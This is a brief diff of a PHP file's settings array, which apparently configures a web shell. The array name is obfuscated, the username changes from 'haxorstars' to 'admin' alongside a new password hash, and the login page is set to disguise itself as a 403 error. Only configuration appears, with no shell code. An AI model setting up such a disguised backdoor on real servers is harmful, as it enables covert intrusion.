@@ -1,8 +1,8 @@
 <?php
 
 $GLOBALS['oZgNypoPRU'] = array(
-    'username' => 'haxorstars',
-    'password' => 'a95c777028b2e3653a012232c6a8cca1',
+    'username' => 'admin',
+    'password' => 'bd72c9b26fdc503368e8ec244efcad5e',
     'safe_mode' => '1',
     'login_page' => '403',
     'show_icons' => '1',
